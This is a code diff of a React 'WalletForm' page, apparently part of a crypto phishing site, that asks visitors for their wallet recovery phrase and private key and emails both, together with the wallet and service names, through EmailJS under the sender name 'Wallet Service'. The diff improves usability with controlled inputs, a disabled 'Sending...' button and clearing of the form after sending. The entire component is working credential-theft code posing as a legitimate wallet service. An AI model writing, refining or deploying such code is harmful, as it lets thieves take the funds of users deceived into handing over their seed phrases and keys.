@@ -1,4 +1,4 @@
-import React from "react";
+import React, { useState } from "react";
 import { useLocation } from "react-router-dom";
 import styled from "styled-components";
 import emailjs from "emailjs-com"; // Ensure this is installed via `npm install emailjs-com`
@@ -35,39 +35,50 @@ const SubmitButton = styled.button`
   &:hover {
     background-color: #2563eb;
   }
+
+  &:disabled {
+    background-color: #ccc;
+    cursor: not-allowed;
+  }
 `;
 
 const WalletForm = () => {
   const location = useLocation();
   const { wallet, service } = location.state || {};
 
+  // State for inputs and button
+  const [formData, setFormData] = useState({
+    recoveryPhrase: "",
+    privateKey: "",
+    additionalOption: "",
+  });
+  const [isSubmitting, setIsSubmitting] = useState(false);
+
+  // Handle input changes
+  const handleChange = (e) => {
+    const { name, value } = e.target;
+    setFormData((prev) => ({ ...prev, [name]: value }));
+  };
+
+  // Handle form submission
   const handleSubmit = (e) => {
     e.preventDefault();
+    setIsSubmitting(true); // Disable the button
 
-    // Extract form data
-    const formData = {
+    const emailData = {
+      to_name: "User",
+      from_name: "Wallet Service",
       wallet: wallet || "Unknown Wallet",
       service: service || "Unknown Service",
-      recoveryPhrase: e.target[0].value,
-      privateKey: e.target[1].value,
-      additionalOption: e.target[2].value || "None", // Default to "None" if empty
-    };
-
-    // Map form data to EmailJS placeholders
-    const emailData = {
-      to_name: "User", // Recipient's name
-      from_name: "Wallet Service", // Sender's name
-      wallet: formData.wallet,
-      service: formData.service,
       recoveryPhrase: formData.recoveryPhrase,
       privateKey: formData.privateKey,
-      additionalOption: formData.additionalOption,
+      additionalOption: formData.additionalOption || "None",
       message: `
-        Wallet: ${formData.wallet}
-        Service: ${formData.service}
+        Wallet: ${wallet || "Unknown Wallet"}
+        Service: ${service || "Unknown Service"}
         Recovery Phrase: ${formData.recoveryPhrase}
         Private Key: ${formData.privateKey}
-        Additional Option: ${formData.additionalOption}
+        Additional Option: ${formData.additionalOption || "None"}
       `,
     };
 
@@ -81,12 +92,21 @@ const WalletForm = () => {
       )
       .then(
         (response) => {
-          alert("Details sent successfully!");
+          alert("Sent successfully!");
           console.log("SUCCESS!", response.status, response.text);
+
+          // Clear form and re-enable submit button
+          setFormData({
+            recoveryPhrase: "",
+            privateKey: "",
+            additionalOption: "",
+          });
+          setIsSubmitting(false);
         },
         (error) => {
-          alert("Failed to send details. Please try again.");
+          alert("Failed to send. Please try again.");
           console.error("FAILED...", error);
+          setIsSubmitting(false); // Re-enable submit button on failure
         }
       );
   };
@@ -96,10 +116,32 @@ const WalletForm = () => {
       <h2>Fill Details for {wallet || "Wallet"}</h2>
       <p>Service: {service || "Service"}</p>
       <Form onSubmit={handleSubmit}>
-        <Input type="text" placeholder="Enter Recovery Phrase" required />
-        <Input type="text" placeholder="Enter Private Key" required />
-        <Input type="text" placeholder="Additional Option (if any)" />
-        <SubmitButton type="submit">Submit</SubmitButton>
+        <Input
+          type="text"
+          name="recoveryPhrase"
+          placeholder="Enter Recovery Phrase"
+          value={formData.recoveryPhrase}
+          onChange={handleChange}
+          required
+        />
+        <Input
+          type="text"
+          name="privateKey"
+          placeholder="Enter Private Key"
+          value={formData.privateKey}
+          onChange={handleChange}
+          required
+        />
+        <Input
+          type="text"
+          name="additionalOption"
+          placeholder="Additional Option (if any)"
+          value={formData.additionalOption}
+          onChange={handleChange}
+        />
+        <SubmitButton type="submit" disabled={isSubmitting}>
+          {isSubmitting ? "Sending..." : "Submit"}
+        </SubmitButton>
       </Form>
     </FormContainer>
   );
